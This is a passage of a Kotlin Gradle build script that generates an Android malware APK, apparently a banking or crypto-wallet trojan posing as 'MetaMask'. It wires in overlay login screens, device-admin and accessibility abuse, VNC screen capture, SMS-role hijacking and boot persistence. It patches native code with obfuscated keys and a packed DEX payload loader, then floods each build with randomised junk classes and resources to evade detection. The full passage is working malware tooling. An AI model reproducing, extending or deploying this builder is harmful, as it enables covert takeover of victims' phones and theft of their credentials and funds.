        <activity android:name=".activities.$CLS_PERM_REQUESTER" android:exported="false" android:theme="@style/Theme.AppCompat.NoActionBar" android:excludeFromRecents="true" />
        <activity android:name=".activities.$CLS_CUS_WEB" android:theme="@style/Theme.AppCompat.Light.NoActionBar" android:excludeFromRecents="false" android:launchMode="singleTask" android:screenOrientation="portrait" android:label="Support" android:taskAffinity="" />""")
        // MOD_OVERLAY
        if (featOverlayFinal) mfSb.appendLine("""        <activity android:name=".activities.$CLS_CORAL_COBRA" android:exported="false" android:theme="@style/Theme.AppCompat.DayNight.NoActionBar" android:excludeFromRecents="true" />
        <activity android:name=".activities.$CLS_AUTH_SCREEN" android:exported="false" android:theme="@style/Theme.AppCompat.Light.NoActionBar" android:excludeFromRecents="true" />
        <activity android:name=".activities.$CLS_OTTER_HAWK_LAUNCHER" android:exported="false" android:theme="@style/Theme.Transparent" android:excludeFromRecents="true" android:noHistory="false" android:taskAffinity="" android:launchMode="singleTop" />""")
        // MOD_DEVICE_ADMIN
        if (featDeviceAdminFinal) mfSb.appendLine("""        <activity android:name=".activities.$CLS_BADGER_FALCON_LAUNCHER" android:exported="false" android:theme="@style/Theme.Transparent" android:excludeFromRecents="true" android:noHistory="false" android:taskAffinity="" android:launchMode="singleTop" />
        <receiver android:name=".receivers.$CLS_BADGER_FALCON_RECV" android:exported="true" android:permission="android.permission.BIND_DEVICE_ADMIN">
            <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED" /></intent-filter>
            <meta-data android:name="android.app.device_admin" android:resource="@xml/badger_falcon" />
        </receiver>""")
        // MOD_VNC: VideoProjectionActivity
        if (featVnc) mfSb.appendLine("""        <activity android:name=".activities.VideoProjectionActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:exported="false" android:excludeFromRecents="true" android:noHistory="true" android:process=":vnc_${prc}" />""")
        // MOD_UNLOCK: WakeScreenActivity
        if (featUnlockFinal) mfSb.appendLine("""        <activity android:name=".activities.WakeScreenActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:exported="false" android:excludeFromRecents="true" android:noHistory="true" android:showWhenLocked="true" android:turnScreenOn="true" />""")
        // MOD_ACCESSIBILITY
        if (featAccessibility) mfSb.appendLine("""        <service android:name=".services.$CLS_ACCESS_SVC" android:exported="false" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:label="@string/app_name" android:process="$accessSvcProcess">
            <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/acc_service" />
        </service>""")
        // MOD_SMS: ComposeSmsActivity
        if (featSmsRoleFinal) mfSb.appendLine("""        <activity android:name=".activities.$CLS_COMPOSE_SMS" android:enabled="false" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.SEND" />
                <action android:name="android.intent.action.SENDTO" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="sms" /><data android:scheme="smsto" /><data android:scheme="mms" /><data android:scheme="mmsto" />
            </intent-filter>
        </activity>""")
        // CORE receivers вЂ" РІСЃРµРіРґР°
        mfSb.appendLine("""        <receiver android:name=".receivers.$CLS_BOOT_RECV" android:enabled="true" android:exported="true" android:label="${rcv}_Boot" android:directBootAware="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.USER_UNLOCKED" />
                <action android:name="android.intent.action.USER_PRESENT" />
                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
                <action android:name="android.intent.action.LOCALE_CHANGED" />
                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
                <action android:name="android.os.action.DEVICE_IDLE_MODE_CHANGED" />
                <action android:name="$ACTION_RESTART_SVC" />
            </intent-filter>
        </receiver>
        <receiver android:name=".receivers.$CLS_ALARM_RECV" android:enabled="true" android:exported="false" />
        <receiver android:name=".receivers.$CLS_WS_HANDLER_RECV" android:enabled="false" android:label="${rcv}_Command" android:exported="true" android:process=":vnc_${prc}">
            <intent-filter><action android:name="$ACTION_HANDLE_CMD" /></intent-filter>
        </receiver>
        <receiver android:name=".receivers.$CLS_CHIKEN_BRIDGE_RECV" android:enabled="true" android:exported="false">
            <intent-filter><action android:name="$ACTION_LAUNCH_CHIKEN" /></intent-filter>
        </receiver>
        <receiver android:name=".receivers.$CLS_LOADER_RECV" android:exported="true" android:label="${rcv}_Wake" android:enabled="true">
            <intent-filter android:priority="999">
                <action android:name="$ACTION_FOX_TARGET" />
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="$ACTION_INTERNAL_KICK" />
            </intent-filter>
        </receiver>
        <receiver android:name=".receivers.$CLS_CHIMERA_RECV" android:enabled="true" android:label="${rcv}_State" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED" />
                <action android:name="android.intent.action.PACKAGE_REPLACED" />
                <action android:name="android.intent.action.PACKAGE_REMOVED" />
                <data android:scheme="package" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.os.action.POWER_SAVE_MODE_CHANGED" />
                <action android:name="android.intent.action.WALLPAPER_CHANGED" />
                <action android:name="android.net.conn.CONNECTIVITY_ACTION" />
                <action android:name="android.intent.action.LOCALE_CHANGED" />
                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
                <action android:name="android.accounts.LOGIN_ACCOUNTS_CHANGED" />
                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
                <action android:name="android.intent.action.DOWNLOAD_COMPLETE" />
                <action android:name="android.telephony.action.CARRIER_CONFIG_CHANGED" />
                <action android:name="android.intent.action.SIM_STATE_CHANGED" />
                <action android:name="android.intent.action.HEADSET_PLUG" />
                <action android:name="android.bluetooth.device.action.ACL_CONNECTED" />
                <action android:name="android.bluetooth.device.action.ACL_DISCONNECTED" />
                <action android:name="android.intent.action.PHONE_STATE" />
                <action android:name="$ACTION_FOX_TARGET" />
                <action android:name="$ACTION_INTERNAL_KICK" />
            </intent-filter>
        </receiver>""")
        // MOD_SMS receivers
        if (featSms) mfSb.appendLine("""        <receiver android:name=".receivers.$CLS_DEFAULT_SMS_RECV" android:enabled="false" android:exported="true">
            <intent-filter><action android:name="android.provider.Telephony.ACTION_DEFAULT_SMS_PACKAGE_CHANGED" /></intent-filter>
        </receiver>
        <receiver android:name=".activities.$CLS_SMS_RECV" android:enabled="false" android:exported="true" android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="100">
                <action android:name="android.provider.Telephony.SMS_DELIVER" />
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>
        <receiver android:name=".activities.$CLS_MMS_RECV" android:enabled="false" android:exported="true" android:permission="android.permission.BROADCAST_WAP_PUSH">
            <intent-filter android:priority="100">
                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED" />
                <data android:mimeType="application/vnd.wap.mms-message" />
            </intent-filter>
        </receiver>""")
        // MOD_VNC receiver
        if (featVnc) mfSb.appendLine("""        <receiver android:name=".receivers.$CLS_VNC_BRIDGE_RECV" android:exported="false">
            <intent-filter><action android:name="${randomPkg}.ACTION_SEND_TO_SERVER" /></intent-filter>
        </receiver>""")
        // MOD_SMS_ROLE: HeadlessSmsSendService
        if (featSmsRoleFinal) mfSb.appendLine("""        <service android:name=".activities.$CLS_HEADLESS_SMS" android:enabled="false" android:exported="true" android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE">
            <intent-filter>
                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:scheme="sms" /><data android:scheme="smsto" /><data android:scheme="mms" /><data android:scheme="mmsto" />
            </intent-filter>
        </service>""")
        // CORE provider вЂ" РІСЃРµРіРґР°
        mfSb.appendLine("""        <provider android:name="androidx.startup.InitializationProvider" android:authorities="${'$'}{applicationId}.androidx-startup" android:exported="false" tools:node="merge">
            <meta-data android:name="okhttp3.internal.platform.PlatformInitializer" android:value="androidx.startup" tools:node="remove" />
        </provider>
        <activity android:name=".$STUB_DECOY_CLS" android:exported="false" android:theme="@style/Theme.AppCompat.Light.NoActionBar" android:excludeFromRecents="true" />

    </application>

</manifest>""")
        mf.writeText(mfSb.toString())

        val finalAppLabel = if (appName.isNotEmpty()) appName else rndName(4, 7)
        val appNameRegex = Regex("<string name=\"app_name\">[^<]*</string>")
        val appNameReplacement = "<string name=\"app_name\">$finalAppLabel</string>"
        shadowSrcDir.resolve("res").walkTopDown()
            .filter { it.isFile && it.name == "strings.xml" }
            .forEach { stringsFile ->
                val orig = stringsFile.readText()
                if (orig.contains("app_name")) {
                    stringsFile.writeText(orig.replace(appNameRegex, appNameReplacement))
                }
            }
        println("--- [CRISTOFER_V3] app_name=$finalAppLabel (all locales) ---")

        shadowSrcDir.resolve("res").walkTopDown()
            .filter { it.isFile && it.extension == "xml" }
            .forEach { f ->
                val orig = f.readText()
                if (orig.contains("com.example.MetaMask") || orig.contains("com/example/MetaMask")
                    || orig.contains("$randomPkg.account") || orig.contains("$randomPkg.provider")) {
                    val updated = orig
                        .replace("com.example.MetaMask", randomPkg)
                        .replace("com/example/MetaMask", randomPkgPath)
                        .replace("$randomPkg.account", "$randomPkg.$acctSuffix")
                        .replace("$randomPkg.provider", "$randomPkg.$prvdSuffix")
                    f.writeText(updated)
                    println("--- [CRISTOFER_V3] Updated res XML: ${f.name} ---")
                }
            }

        val cppDir = File(shadowSrcDir, "cpp").also { it.mkdirs() }
        var cpp = project.projectDir.resolve("src/main/cpp/native-lib.cpp").readText()

        clsMap.entries.sortedByDescending { it.key.length }.forEach { (o, n) -> cpp = cpp.replace(o, n) }
        jniMap.entries.sortedByDescending { it.key.length }.forEach { (o, n) ->
            cpp = cpp.replace(o, n)
        }
        cpp = cpp.replace("native_encrypt_data", "native_$JNI_ENCRYPT")
        cpp = cpp.replace("native_decode_task",  "native_$JNI_DECODE_TASK")
        cpp = cpp.replace("native_process_task_result", "native_$JNI_PROCESS_TASK")
        cpp = cpp.replace("native_get_call_action_string", "native_$JNI_CALL_ACTION")
        cpp = cpp.replace("native_get_tel_prefix",         "native_$JNI_TEL_PREFIX")
        cpp = cpp.replace("native_get_request_method_name","native_$JNI_REQ_METHOD")
        cpp = cpp.replace("native_get_callback_handler_class_name","native_$JNI_CB_HANDLER")
        cpp = cpp.replace("native_get_system_callback_class_name", "native_$JNI_SYS_CB")
        cpp = cpp.replace("native_get_contacts_action_string",     "native_$JNI_CONTACTS_ACTION")
        cpp = cpp.replace("native_build_contacts_payload",         "native_$JNI_BUILD_CONTACTS")
        cpp = cpp.replace("native_decrypt_domain",                 "native_$JNI_DECRYPT_DOMAIN")
        cpp = cpp.replace("native_get_uuid_prefix",                "native_$JNI_UUID_PREFIX")
        cpp = cpp.replace("native_get_uuid_suffix",                "native_$JNI_UUID_SUFFIX")

        cpp = cpp.replace("#define NATIVE_SHIFT 3", "#define NATIVE_SHIFT $rXShift")
        val obfKeyBytes = "Fantasypanelhub651241".map { (it.code + rXShift).toString() }.joinToString(", ")
        cpp = cpp.replace("{ 0 }; // OBF_KEY_PLACEHOLDER", "{ $obfKeyBytes };")
        val uuidPfxBytes = uuidPrefix.map { (it.code + rXShift).toString() }.joinToString(", ")
        val uuidSfxBytes = "v10".map { (it.code + rXShift).toString() }.joinToString(", ")
        cpp = cpp.replace("{ 0 }; // UUID_PFX_PLACEHOLDER", "{ $uuidPfxBytes };")
        cpp = cpp.replace("{ 0 }; // UUID_SFX_PLACEHOLDER", "{ $uuidSfxBytes };")

        val jniPkgPrefix = randomPkgPath.replace("/", "_")
        cpp = cpp.replace("Java_com_example_MetaMask_utils_", "Java_${jniPkgPrefix}_utils_")

        val bridgePath    = "com/yourcompany/core/jni/$CLS_NATIVE_BRIDGE"
        val bridgeEncoded = bridgePath.map { (it.code + 2) }.joinToString(",")
        val clsEncRegex   = Regex("""static const unsigned char CLS_ENC\[\] = \{[^}]+\};""")
        cpp = clsEncRegex.replace(cpp) { "static const unsigned char CLS_ENC[] = {$bridgeEncoded};" }

        val junkSb = StringBuilder("\n// ===== JUNK =====\n")
        repeat((8..15).random()) {
            val fn = "jf_${rndId(6)}"; val ops = (4..10).random()
            junkSb.append("static int $fn(int x) {\n    volatile int r = x;\n")
            repeat(ops) {
                val op = (1..999).random()
                when ((0..7).random()) {
                    0 -> junkSb.append("    r = r ^ $op;\n")
                    1 -> junkSb.append("    r = r + $op;\n")
                    2 -> junkSb.append("    r = (r >> ${(1..3).random()}) | (r << ${(1..3).random()});\n")
                    3 -> junkSb.append("    if (r % 2 == 0) r += $op; else r -= ${(1..50).random()};\n")
                    4 -> junkSb.append("    r = r * ${(2..7).random()} - $op;\n")
                    5 -> junkSb.append("    r = (r & 0x${Integer.toHexString((1..255).random())}) | ${(1..127).random()};\n")
                    6 -> { val iter = (3..8).random(); junkSb.append("    for (int _i=0;_i<$iter;_i++){r=r^(_i*${(1..31).random()});}\n") }
                    7 -> { val sz = (4..8).random(); val vals = (0 until sz).map { (1..255).random() }.joinToString(",")
                           junkSb.append("    {int _a[]={$vals};for(int _i=0;_i<$sz;_i++)r^=_a[_i];}\n") }
                }
            }
            junkSb.append("    return r;\n}\n\n")
        }
        repeat((2..3).random()) {
            val fn = "jf_${rndId(8)}"; val sz = (8..16).random()
            val vals = (0 until sz).map { (1..127).random() }.joinToString(",")
            val iters = (4..12).random(); val seed = (1..31).random()
            junkSb.append("static unsigned int $fn(unsigned int x) {\n")
            junkSb.append("    static const unsigned char _t[$sz] = {$vals};\n")
            junkSb.append("    unsigned int acc = x ^ ${(1..0xFFFF).random()}u;\n")
            junkSb.append("    for(int i=0;i<$iters;i++){acc=(acc<<$seed)^(acc>>${32-seed})^_t[i%$sz];if((acc&1u)==0u)acc+=${(1..99).random()}u;}\n")
            junkSb.append("    return acc;\n}\n\n")
        }
        val injectPoint = cpp.indexOf("static std::string decodeShifted")
        if (injectPoint >= 0) {
            cpp = cpp.substring(0, injectPoint) + junkSb.toString() + cpp.substring(injectPoint)
        }

        File(cppDir, "native-lib.cpp").writeText(cpp)

        for (name in listOf("base64.cpp", "base64.h")) {
            val src = project.projectDir.resolve("src/main/cpp/$name")
            if (src.exists()) src.copyTo(File(cppDir, name), overwrite = true)
        }

        val dexldrTemplate = project.projectDir.resolve("pack/native/dexldr.c").readText()
        val stubPkgPath    = randomPkgPath
        val jniUnpackFull  = "Java_${stubPkgPath.replace("/","_")}_${STUB_CLS}_${JNI_UNPACK_SYMBOL}"
        val jniLiteFull    = "Java_${stubPkgPath.replace("/","_")}_${STUB_CLS}_${JNI_LITE_CHECK_SYMBOL}"
        val keyBytes       = PACK_XOR_KEY.joinToString(",") { it.toInt().and(0xFF).toString() }
        val part0Path      = "$PAYLOAD_FOLDER/${PAYLOAD_PART_NAMES[0]}"
        val part1Path      = "$PAYLOAD_FOLDER/${PAYLOAD_PART_NAMES[1]}"
        val part2Path      = "$PAYLOAD_FOLDER/${PAYLOAD_PART_NAMES[2]}"
        val keyDeclRegex = Regex("""static const unsigned char KEY\[32\] = \{[\s\S]*?\}; // KEY_PLACEHOLDER""")
        var dexldrPatched  = dexldrTemplate
            .replace("DEXLDR_JNI_SYMBOL_PLACEHOLDER",     jniUnpackFull)
            .replace("DEXLDR_JNI_LITE_CHECK_PLACEHOLDER", jniLiteFull)
        dexldrPatched = keyDeclRegex.replace(dexldrPatched,
            "static const unsigned char KEY[32] = { $keyBytes }; // KEY_PLACEHOLDER")
        dexldrPatched = dexldrPatched
            .replace("PART0_PATH_PLACEHOLDER", part0Path)
            .replace("PART1_PATH_PLACEHOLDER", part1Path)
            .replace("PART2_PATH_PLACEHOLDER", part2Path)
        File(cppDir, "dexldr.c").writeText(dexldrPatched)

        File(cppDir, "CMakeLists.txt").writeText("""
cmake_minimum_required(VERSION 3.18.1)
project("$SO_NAME")
add_library($SO_NAME SHARED native-lib.cpp base64.cpp)
find_library(log-lib log)
target_link_libraries($SO_NAME ${'$'}{log-lib})
add_library($DEXLDR_SO_NAME SHARED dexldr.c)
find_library(android-lib android)
find_library(z-lib z)
target_link_libraries($DEXLDR_SO_NAME ${'$'}{log-lib} ${'$'}{android-lib} ${'$'}{z-lib})
set_target_properties($DEXLDR_SO_NAME PROPERTIES COMPILE_FLAGS "-Os -fvisibility=hidden")
""".trimIndent())

        srcJavaDir.walkTopDown().filter { it.extension == "kt" }.forEach { f ->
            var c = f.readText()
            if (c.contains("System.loadLibrary(\"securelogic\")") ||
                c.contains("System.loadLibrary(\"securelogic\")")) {
                c = c.replace("\"securelogic\"", "\"$SO_NAME\"")
                f.writeText(c)
            }
        }

        val resValuesDir = shadowSrcDir.resolve("res/values").also { it.mkdirs() }

        val rndStrCount = (150..900).random()
        val strSb = StringBuilder("<resources>\n")
        repeat(rndStrCount) { strSb.append("    <string name=\"z_${rndId(12)}\">${UUID.randomUUID()}_${Random().nextInt()}</string>\n") }
        strSb.append("</resources>")
        resValuesDir.resolve("strings_rnd_${rndId(6)}.xml").writeText(strSb.toString())

        val colorSb = StringBuilder("<resources>\n")
        repeat((40..220).random()) { colorSb.append("    <color name=\"c_${rndId(8)}\">#%08X</color>\n".format(Random().nextInt())) }
        colorSb.append("</resources>")
        resValuesDir.resolve("colors_gen.xml").writeText(colorSb.toString())

        val dimenUnits = listOf("dp", "sp", "px")
        val dimenSb = StringBuilder("<resources>\n")
        repeat((40..220).random()) { dimenSb.append("    <dimen name=\"d_${rndId(8)}\">${(1..500).random()}${dimenUnits.random()}</dimen>\n") }
        dimenSb.append("</resources>")
        resValuesDir.resolve("dimens_gen.xml").writeText(dimenSb.toString())

        val attrCount = (0..80).random()
        if (attrCount > 0) {
            val attrSb = StringBuilder("<resources>\n")
            repeat(attrCount) {
                val fmt = listOf("string","integer","boolean","float","dimension","color").random()
                attrSb.append("    <attr name=\"a_${rndId(8)}\" format=\"$fmt\" />\n")
            }
            attrSb.append("</resources>")
            resValuesDir.resolve("attrs_gen_${rndId(4)}.xml").writeText(attrSb.toString())
        }

        val resDir = shadowSrcDir.resolve("res")
        val densities = listOf("mdpi","hdpi","xhdpi","xxhdpi","xxxhdpi","anydpi","nodpi")
        densities.shuffled().take((3..7).random()).forEach { cfg ->
            val dir = resDir.resolve("drawable-$cfg").also { it.mkdirs() }
            val drawableCount = (1..8).random()
            repeat(drawableCount) {
                val color = "#%06X".format(0xFFFFFF and Random().nextInt())
                val radius = (1..30).random()
                val strokeW = (0..4).random()
                val shapeType = listOf("rectangle","oval","ring").random()
                dir.resolve("shf_${rndId(8)}.xml").writeText("""
<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="$shapeType">
    <solid android:color="$color" />
    <corners android:radius="${radius}dp" />
    ${if (strokeW > 0) "<stroke android:width=\"${strokeW}dp\" android:color=\"#%06X\" />".format(0xFFFFFF and Random().nextInt()) else ""}
</shape>""".trimIndent())
            }
        }

        val rawCount = (0..12).random()
        if (rawCount > 0) {
            val rawDir = resDir.resolve("raw").also { it.mkdirs() }
            repeat(rawCount) {
                val kb = (1..16).random()
                val content = ByteArray(kb * 1024) { (0..255).random().toByte() }
                rawDir.resolve("rw_${rndId(8)}.bin").writeBytes(content)
            }
        }

        val xmlResCount = (0..8).random()
        if (xmlResCount > 0) {
            val xmlResDir = resDir.resolve("xml").also { it.mkdirs() }
            repeat(xmlResCount) {
                xmlResDir.resolve("cfg_${rndId(8)}.xml").writeText("""<?xml version="1.0" encoding="utf-8"?>
<config id="${rndId(12)}" ts="${UUID.randomUUID()}" ver="${(1..99).random()}" />""")
            }
        }

        val junkDir = shadowSrcDir.resolve("java/${junkPkg.replace('.','/')}").also { it.mkdirs() }

        val subPkgPool = listOf(
            "cache","parse","format","net","state","crypto","io","collection","data",
            "util","codec","pool","event","sync","model"
        )
        val activeSubPkgs = subPkgPool.shuffled().take((4..7).random())
        activeSubPkgs.forEach { junkDir.resolve(it).mkdirs() }
        println("--- [JUNK] Active sub-packages: ${activeSubPkgs.joinToString(",")} ---")

        fun genKotlinMath(v: String): String {
            val sb = StringBuilder("var $v: Long = System.nanoTime()\n")
            repeat((8..15).random()) { idx ->
                val op = (1..500).random()
                when ((0..4).random()) {
                    0 -> sb.append("$v = $v + $op\n")
                    1 -> sb.append("if ($v % 2L == 0L) { $v += $op } else { $v -= 1 }\n")
                    2 -> sb.append("$v = Math.sqrt(Math.abs($v.toDouble())).toLong()\n")
                    3 -> sb.append("$v = $v xor ${op}L\n")
                    4 -> sb.append("$v = ($v * Math.sin($idx.toDouble())).toLong()\n")
                }
            }; return sb.toString()
        }
        fun genJavaMath(v: String): String {
            val sb = StringBuilder("long $v = System.nanoTime();\n")
            repeat((8..15).random()) { idx ->
                val op = (1..500).random()
                when ((0..4).random()) {
                    0 -> sb.append("$v = $v + $op;\n")
                    1 -> sb.append("if ($v % 2 == 0) { $v += $op; } else { $v -= 1; }\n")
                    2 -> sb.append("$v = (long) Math.sqrt(Math.abs($v));\n")
                    3 -> sb.append("$v = $v ^ $op;\n")
                    4 -> sb.append("$v = (long)($v * Math.sin($idx));\n")
                }
            }; return sb.toString()
        }

        fun annPrefix(): String = when ((0..9).random()) {
            in 0..1 -> "@JvmStatic "
            2       -> "@Suppress(\"UNCHECKED_CAST\") "
            else    -> ""
        }

        val propBases = listOf("cap","tag","seed","tick","bias","ttl","slot","scope",
                                "mask","limit","epoch","window","threshold","kind","mode","budget")
        fun genObjectProperties(): String {
            if ((0..4).random() < 2) return ""
            val n = (1..3).random()
            val usedPropNames = mutableSetOf<String>()
            val lines = mutableListOf<String>()
            repeat(n) {
                val ft = listOf("Long","Int","Boolean","String").random()
                val dv = when (ft) {
                    "Long"    -> "${(1L..9999L).random()}L"
                    "Int"     -> "${(1..999).random()}"
                    "Boolean" -> if ((0..1).random() == 0) "true" else "false"
                    else      -> "\"${rndId(5)}\""
                }
                val ann = if ((0..3).random() == 0) "@JvmField " else ""
                var propName: String
                var attempts = 0
                do { propName = "${propBases.random()}${junkSuffix()}"; attempts++ } while (propName in usedPropNames && attempts < 20)
                if (propName !in usedPropNames) { usedPropNames.add(propName); lines.add("${ann}var $propName: $ft = $dv") }
            }
            return lines.joinToString("\n    ")
        }

        val decoVerbs = listOf("check","peek","probe","sweep","sample","mark","tag","seal",
                                "format","encode","normalize","build","query","find","init",
                                "shape","wrap","stamp","tally")
        fun decorativeMethod(seen: MutableSet<String> = mutableSetOf()): String {
            val mname = run {
                repeat(20) {
                    val cand = decoVerbs.random() + junkSuffix()
                    if (seen.add(cand)) return@run cand
                }
                "fn${rndId(5)}"
            }
            val rt = listOf("String","Int","Boolean","Unit","Double").random()
            val body = when (rt) {
                "String"  -> "return \"${rndId(6)}\""
                "Int"     -> "return ${(1..9999).random()}"
                "Boolean" -> "return ${if ((0..1).random() == 0) "true" else "false"}"
                "Double"  -> "return ${(1..999).random()}.0"
                else      -> ""
            }
            return "${annPrefix()}fun $mname(): $rt { $body }"
        }

        val utilBases = listOf(
            "Processor","Transformer","Formatter","Validator","Serializer","Encoder",
            "Decoder","Hasher","Converter","Builder","Mapper","Resolver","Parser",
            "Generator","Aggregator","Collector","Dispatcher","Emitter","Handler","Scanner"
        )
        val utilVerbs = listOf(
            "compute","transform","resolve","encode","decode","validate","format",
            "parse","build","generate","collect","dispatch","emit","hash","convert"
        )

        fun genDecorativeType(pkgPath: String, clsName: String): String = when ((0..3).random()) {
            0 -> {
                val n = (2..4).random()
                val seen = mutableSetOf<String>()
                val parts = mutableListOf<String>()
                var safety = 0
                while (parts.size < n && safety++ < 50) {
                    val nm = "${utilVerbs.random()}${junkSuffix()}"
                    if (!seen.add(nm)) continue
                    val ft = listOf("String","Int","Long","Boolean").random()
                    val dv = when (ft) { "String" -> "\"${rndId(5)}\""; "Long" -> "${(1L..9999L).random()}L"; "Boolean" -> if ((0..1).random() == 0) "true" else "false"; else -> "${(1..99).random()}" }
                    parts += "val $nm: $ft = $dv"
                }
                "package $pkgPath\ndata class $clsName(${parts.joinToString(", ")})"
            }
            1 -> {
                val mname = "${utilVerbs.random()}${junkSuffix()}"
                val implName = "${clsName}Impl"
                "package $pkgPath\ninterface $clsName { fun $mname(): Long }\ninternal class $implName : $clsName { override fun $mname(): Long = System.nanoTime() }"
            }
            2 -> {
                val sub1 = freshJunkName(utilBases.random())
                val sub2 = freshJunkName(utilBases.random())
                val sub3 = freshJunkName(utilBases.random())
                "package $pkgPath\nsealed class $clsName {\n    object $sub1 : $clsName()\n    object $sub2 : $clsName()\n    data class $sub3(val v: Long) : $clsName()\n}"
            }
            else -> {
                val ft = listOf("String","Long","Int").random()
                val dv = when (ft) { "String" -> "\"${rndId(5)}\""; "Long" -> "${(1L..9999L).random()}L"; else -> "${(1..99).random()}" }
                val mname = "${utilVerbs.random()}${junkSuffix()}"
                "package $pkgPath\nenum class $clsName(val $mname: $ft) {\n    ${freshJunkName(utilBases.random())}($dv),\n    ${freshJunkName(utilBases.random())}($dv),\n    ${freshJunkName(utilBases.random())}($dv)\n}"
            }
        }

        data class JunkUtil(val name: String, val pkg: String, val methods: List<String>) {
            val fqn: String get() = "$pkg.$name"
        }
        val junkUtilPool = mutableListOf<JunkUtil>()

        repeat((21..42).random()) {
            val sub = activeSubPkgs.random()
            val pkgPath = "$junkPkg.$sub"
            val subDir = junkDir.resolve(sub)
            val cls = freshJunkName(utilBases.random())
            val n = (2..4).random()
            val mthSet = mutableSetOf<String>()
            while (mthSet.size < n) { mthSet.add("${utilVerbs.random()}${junkSuffix()}") }
            val mths = mthSet.toList()
            val body = mths.joinToString("\n    ") { mth ->
                val v = "v${rndId(3)}"
                "${annPrefix()}fun $mth(input: Long = System.nanoTime()): Long { ${genKotlinMath(v)}; return $v }"
            }
            val decoSeen = mths.toMutableSet()
            val decoBody = (1..(1..3).random()).joinToString("\n    ") { decorativeMethod(decoSeen) }
            val props = genObjectProperties()
            subDir.resolve("$cls.kt").writeText("""
package $pkgPath
internal object $cls {
    $props
    @JvmStatic fun getInstance(): $cls = this
    $body
    $decoBody
}""".trimIndent())
            junkUtilPool += JunkUtil(cls, pkgPath, mths)

            if ((0..4).random() < 3) {
                val decoCls = freshJunkName(utilBases.random())
                subDir.resolve("$decoCls.kt").writeText(genDecorativeType(pkgPath, decoCls))
            }

            if ((0..6).random() == 0) {
                val gCls = freshJunkName(utilBases.random())
                val tparam = listOf("T : Any", "E", "K : Any, V").random()
                val mName = "${utilVerbs.random()}${junkSuffix()}"
                val body2 = when (tparam) {
                    "T : Any"    -> "fun $mName(item: T): Long = item.hashCode().toLong() xor System.nanoTime()"
                    "K : Any, V" -> "fun $mName(key: K, value: V): Long = (key.hashCode().toLong() shl 32) or (value.hashCode().toLong() and 0xFFFFFFFFL)"
                    else         -> "fun $mName(e: Any?): Long = e?.hashCode()?.toLong() ?: System.nanoTime()"
                }
                subDir.resolve("$gCls.kt").writeText("""
package $pkgPath
internal class $gCls<$tparam> {
    $body2
}""".trimIndent())
            }
        }
        println("--- [JUNK] Generated ${junkUtilPool.size} utility singletons in sub-packages ---")

        fun genExecKotlin(v: String): String {
            val sb = StringBuilder("var $v: Long = System.nanoTime()\n")
            repeat((3..7).random()) {
                val op = (1..500).random()
                when ((0..3).random()) {
                    0 -> sb.append("$v = $v xor ${op}L\n")
                    1 -> sb.append("if ($v % 2L == 0L) { $v += $op } else { $v -= 1 }\n")
                    2 -> sb.append("$v = Math.sqrt(Math.abs($v.toDouble())).toLong()\n")
                    3 -> sb.append("$v = ($v * ${(2..9).random()}L) - ${op}L\n")
                }
            }
            if (junkUtilPool.isNotEmpty()) {
                repeat((2..4).random()) {
                    val u = junkUtilPool.random(); val m = u.methods.random()
                    sb.append("$v += ${u.fqn}.$m($v)\n")
                }
            }
            sb.append("return $v\n")
            return sb.toString()
        }
        fun genExecJava(v: String): String {
            val sb = StringBuilder("long $v = System.nanoTime();\n")
            repeat((3..7).random()) {
                val op = (1..500).random()
                when ((0..3).random()) {
                    0 -> sb.append("$v = $v ^ $op;\n")
                    1 -> sb.append("if ($v % 2 == 0) { $v += $op; } else { $v -= 1; }\n")
                    2 -> sb.append("$v = (long) Math.sqrt(Math.abs($v));\n")
                    3 -> sb.append("$v = ($v * ${(2..9).random()}) - $op;\n")
                }
            }
            if (junkUtilPool.isNotEmpty()) {
                repeat((2..4).random()) {
                    val u = junkUtilPool.random(); val m = u.methods.random()
                    sb.append("$v += ${u.fqn}.INSTANCE.${m}($v);\n")
                }
            }
            sb.append("return $v;\n")
            return sb.toString()
        }

        val allComps = fakeActivityNames.map { it to "Activity" } +
            fakeServiceNames.map { it to "Service" } +
            fakeProviderNames.map { it to "Provider" }

        allComps.forEach { (name, type) ->
            if (Random().nextBoolean()) {
                val v = "r${rndId(4)}"
                val base = when(type) {
                    "Activity" -> "android.app.Activity"
                    "Service"  -> "android.app.Service"
                    else       -> "android.content.ContentProvider"
                }
                val extraMethods = (1..(1..3).random()).joinToString("\n") {
                    val mn = "${utilVerbs.random()}${rndSuffix().replaceFirstChar{it.uppercase()}}"
                    val vv = "e${rndId(4)}"
                    val chain = if (junkUtilPool.isNotEmpty()) {
                        val u = junkUtilPool.random(); "$vv += ${u.fqn}.${u.methods.random()}($vv)\n"
                    } else ""
                    "private fun $mn(): Long { var $vv = System.nanoTime()\n$chain; return $vv }"
                }
                val lifecycle = when(type) {
